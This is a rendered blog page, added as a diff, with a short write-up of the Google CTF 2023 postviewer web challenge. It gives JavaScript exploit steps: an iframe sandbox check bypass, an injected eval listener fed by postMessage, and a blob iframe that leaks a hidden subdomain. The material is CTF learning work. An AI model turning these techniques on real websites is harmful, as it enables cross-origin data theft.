@@ -1,0 +1,262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  
+    <title>Google CTF postviewer all versions :: </title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Postviewer 2023 Assume, attacker&rsquo;s page: http://hritik.sh iframe shim page: http://sbx-aeu.localhost:1337/shim.html?o=http://hritik.sh
+ifr1 = document.createElement(&#39;iframe&#39;) ifr1.src = &#39;http://sbx-aeu.localhost:1337/shim.html?o=http://hritik.sh&#39; document.body.appendChild(ifr1)Bypass allow-same-origin regex check (/g) and create an iframe:
+" />
+<meta name="keywords" content="ctf, google" />
+
+  <meta name="robots" content="noodp" />
+
+<link rel="canonical" href="http://localhost:1313/ctf-writeups/gctf-postviewer/" />
+
+
+
+
+
+
+  
+  
+  
+  
+  
+  <link rel="stylesheet" href="http://localhost:1313/styles.css">
+
+
+
+<link rel="stylesheet" href="http://localhost:1313/style.css">
+
+
+
+  <link rel="shortcut icon" href="http://localhost:1313/favicon.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+  
+    <meta name="twitter:site" content="https://hritik.sh" />
+  
+    <meta name="twitter:creator" content="" />
+
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Google CTF postviewer all versions">
+<meta property="og:description" content="Postviewer 2023 Assume, attacker&rsquo;s page: http://hritik.sh iframe shim page: http://sbx-aeu.localhost:1337/shim.html?o=http://hritik.sh
+ifr1 = document.createElement(&#39;iframe&#39;) ifr1.src = &#39;http://sbx-aeu.localhost:1337/shim.html?o=http://hritik.sh&#39; document.body.appendChild(ifr1)Bypass allow-same-origin regex check (/g) and create an iframe:
+" />
+<meta property="og:url" content="http://localhost:1313/ctf-writeups/gctf-postviewer/" />
+<meta property="og:site_name" content="" />
+
+  
+    <meta property="og:image" content="http://localhost:1313/favicon.png">
+  
+
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="627">
+
+
+  <meta property="article:published_time" content="2025-07-02 00:00:00 &#43;0000 UTC" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="green">
+
+
+<div class="container full">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    Hritik&#39;s Blog
+  </div>
+</a>
+
+    </div>
+    
+      <ul class="menu menu--mobile">
+  <li class="menu__trigger">Menu&nbsp;▾</li>
+  <li>
+    <ul class="menu__dropdown">
+      
+        
+          <li><a href="/ctf-writeups">Writeups</a></li>
+        
+      
+        
+          <li><a href="https://github.com/hritik14">Github</a></li>
+        
+      
+        
+          <li><a href="/index.xml">RSS</a></li>
+        
+      
+        
+          <li><a href="/cheatsheets">Cheatsheets</a></li>
+        
+      
+        
+          <li><a href="/about">About</a></li>
+        
+      
+        
+          <li><a href="mailto:ping@hritik.sh">Contact</a></li>
+        
+      
+        
+          <li><a href="https://www.linkedin.com/in/hritikvijay/">LinkedIn</a></li>
+        
+      
+      
+    </ul>
+  </li>
+</ul>
+
+    
+    
+  </div>
+  
+    <nav class="navigation-menu">
+  <ul class="navigation-menu__inner menu--desktop">
+    
+      
+        
+          <li><a href="/ctf-writeups" >Writeups</a></li>
+        
+      
+        
+          <li><a href="https://github.com/hritik14" >Github</a></li>
+        
+      
+        
+          <li><a href="/index.xml" >RSS</a></li>
+        
+      
+      
+        <li>
+          <ul class="menu">
+            <li class="menu__trigger">Show more&nbsp;▾</li>
+            <li>
+              <ul class="menu__dropdown">
+                
+                  
+                    <li><a href="/cheatsheets" >Cheatsheets</a></li>
+                  
+                
+                  
+                    <li><a href="/about" >About</a></li>
+                  
+                
+                  
+                    <li><a href="mailto:ping@hritik.sh" >Contact</a></li>
+                  
+                
+                  
+                    <li><a href="https://www.linkedin.com/in/hritikvijay/" >LinkedIn</a></li>
+                  
+                
+              </ul>
+            </li>
+          </ul>
+        </li>
+      
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<article class="post">
+  <h1 class="post-title">
+    <a href="http://localhost:1313/ctf-writeups/gctf-postviewer/">Google CTF postviewer all versions</a>
+  </h1>
+  <div class="post-meta"><time class="post-date">2025-07-02</time></div>
+
+  
+  
+
+
+  
+
+  <div class="post-content"><div>
+        <h1 id="postviewer-2023">Postviewer 2023<a href="#postviewer-2023" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Assume, attacker&rsquo;s page: <a href="http://hritik.sh">http://hritik.sh</a>
+iframe shim page: <a href="http://sbx-aeu.localhost:1337/shim.html?o=http://hritik.sh">http://sbx-aeu.localhost:1337/shim.html?o=http://hritik.sh</a></p>
+<pre class="language-javascript"><code>ifr1 = document.createElement(&#39;iframe&#39;)
+ifr1.src = &#39;http://sbx-aeu.localhost:1337/shim.html?o=http://hritik.sh&#39;
+document.body.appendChild(ifr1)</code></pre><p>Bypass <code>allow-same-origin</code> regex check (<code>/g</code>) and create an iframe:</p>
+<pre class="language-javascript"><code>ifr1.contentWindow.postMessage({&#39;body&#39;: &#39;&lt;iframe name=&#34;ifr2&#34; id=&#34;ifr2&#34;&gt;&lt;/iframe&gt;&lt;script&gt; onmessage= (e) =&gt; {console.log(eval(e.data))}&lt;/script&gt;&#39;, &#39;mimeType&#39;:&#39;text/html&#39;, &#39;sandbox&#39;: [&#39;allow-same-origin&#39;, &#39;allow-same-origin&#39;, &#39;allow-scripts&#39;]}, &#34;*&#34;)</code></pre><p>Create a blob iframe inside of this iframe (parent CSP allows blob only and CSP propagates in local schemes, see: <a href="https://www.w3.org/TR/CSP3/#security-inherit-csp">w3org</a>).
+This iframe will have access to <code>location.ancestorOrigins</code> and thus leak the random sub-domain (<code>aeu</code>).
+This is why <code>allow-same-origin</code> bypass was required, otherwise <code>origin</code> is set to <code>null</code> in <code>sandbox</code>.</p>
+<pre class="language-javascript"><code>top[0][0].postMessage(&#34;blob = new Blob([&#39;&lt;script&gt;top.postMessage(window.location.ancestorOrigins[0], \&#34;*\&#34;)&lt;/script&gt;&#39;], {type: &#39;text/html&#39;}); document.getElementById(&#39;ifr2&#39;).src=URL.createObjectURL(blob)&#34;, &#34;*&#34;)</code></pre><p>In the <a href="https://github.com/google/google-ctf/tree/main/2023/quals/web-postviewer2#top-redirection">top redirection</a> section terjanq says (1) as well could be a Chrome bug because of the comment that says that the ancestor chain should be respected.</p>
+<blockquote>
+<p>// Top navigation is forbidden in sandboxed frames unless opted-in, and only
+// then if the ancestor chain allowed to navigate the top frame.
+// Note: We don&rsquo;t check root fenced frames for kTop* flags since the kTop*
+// flags imply the actual top-level page.</p></blockquote>
+<p>Although, it is NOT a chrome bug as ancestor chain <em>is</em> respected. Here, the top frame is allowed to navigate the iframe because it does not have <code>sandbox</code> set at all.</p>
+<p>I was unable to reproduce his openee-opener trick.</p>
+
+      </div></div>
+
+  
+
+  
+    
+
+  
+</article>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
+    
+      <span>:: <a href="https://github.com/panr/hugo-theme-terminal" target="_blank">Theme</a> made by <a href="https://github.com/panr" target="_blank">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+
+
+
+
+
+<script type="text/javascript" src="/bundle.min.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
